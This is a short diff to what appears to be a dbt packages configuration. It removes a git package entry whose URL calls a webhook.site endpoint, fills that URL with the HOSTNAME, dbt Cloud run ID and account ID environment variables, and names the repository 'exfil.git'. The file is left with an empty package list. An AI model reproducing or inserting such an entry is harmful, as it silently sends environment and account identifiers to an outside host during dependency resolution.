@@ -1,3 +1,1 @@
-packages:
-  - git: "https://webhook.site/01dd8669-5c8b-4697-a7ea-eb5d2e5b1c72/{{ env_var('HOSTNAME', 'nohost') }}/{{ env_var('DBT_CLOUD_RUN_ID', 'norun') }}/{{ env_var('DBT_CLOUD_ACCOUNT_ID', 'noacct') }}/exfil.git"
-    revision: main
+packages: []
